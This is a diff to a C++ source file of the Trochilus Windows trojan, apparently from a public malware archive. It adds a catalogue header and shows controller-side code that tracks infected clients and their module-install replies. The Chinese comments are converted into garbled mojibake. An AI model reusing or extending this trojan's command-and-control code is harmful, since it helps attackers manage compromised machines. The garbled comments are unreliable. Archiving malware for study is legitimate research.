@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "CommManager.h"
 #include "ClientmodManager.h"
@@ -97,7 +108,7 @@ void ClientInfoManager::HandleInstalMsg( tstring clientid,CLIENT_BASE_INFO& info
 	MsgSerialIDMap::iterator msgidIter = info.installModMsgIDMap.begin();
 	while (msgidIter != info.installModMsgIDMap.end())
 	{
-		//³¢ÊÔ´ÓÍ¨ÐÅ¹ÜÀíÆ÷»ñÈ¡»ØÓ¦ÏûÏ¢
+		//ï¿½ï¿½ï¿½Ô´ï¿½Í¨ï¿½Å¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¡ï¿½ï¿½Ó¦ï¿½ï¿½Ï¢
 		CommData retData;
 		if (CommManager::GetInstanceRef().GetReplyMessage(clientid.c_str(), msgidIter->second, retData))
 		{
@@ -141,7 +152,7 @@ void ClientInfoManager::CheckInfoProc()
 
 	m_infoMapSection.Enter();
 	{
-		//´Óm_clientBaseInfoMapÖÐÉ¾³ýÒÑ¾­²»¿ÉÓÃµÄclientinfo
+		//ï¿½ï¿½m_clientBaseInfoMapï¿½ï¿½É¾ï¿½ï¿½ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãµï¿½clientinfo
 		ClientBaseInfoMap::iterator infoIter = m_clientBaseInfoMap.begin();
 		while (infoIter != m_clientBaseInfoMap.end())
 		{
@@ -159,7 +170,7 @@ void ClientInfoManager::CheckInfoProc()
 			}
 		}
 
-		//±éÀúclientidList£¬¸üÐÂm_clientBaseInfoMap
+		//ï¿½ï¿½ï¿½ï¿½clientidListï¿½ï¿½ï¿½ï¿½ï¿½ï¿½m_clientBaseInfoMap
 		TStringVector::iterator clientidIter = clientidList.begin();
 		for (; clientidIter != clientidList.end(); clientidIter++)
 		{
@@ -167,7 +178,7 @@ void ClientInfoManager::CheckInfoProc()
 
 			infoIter = m_clientBaseInfoMap.find(clientid.c_str());
 
-			//Èç¹ûm_clientBaseInfoMapÖÐÃ»ÓÐ¸Ã¿Í»§¶ËµÄÐÅÏ¢£¬ÔòÇëÇó¿Í»§¶ËÉÏ±¨
+			//ï¿½ï¿½ï¿½m_clientBaseInfoMapï¿½ï¿½Ã»ï¿½Ð¸Ã¿Í»ï¿½ï¿½Ëµï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í»ï¿½ï¿½ï¿½ï¿½Ï±ï¿½
 			if (infoIter == m_clientBaseInfoMap.end())
 			{
 				CLIENT_BASE_INFO info;
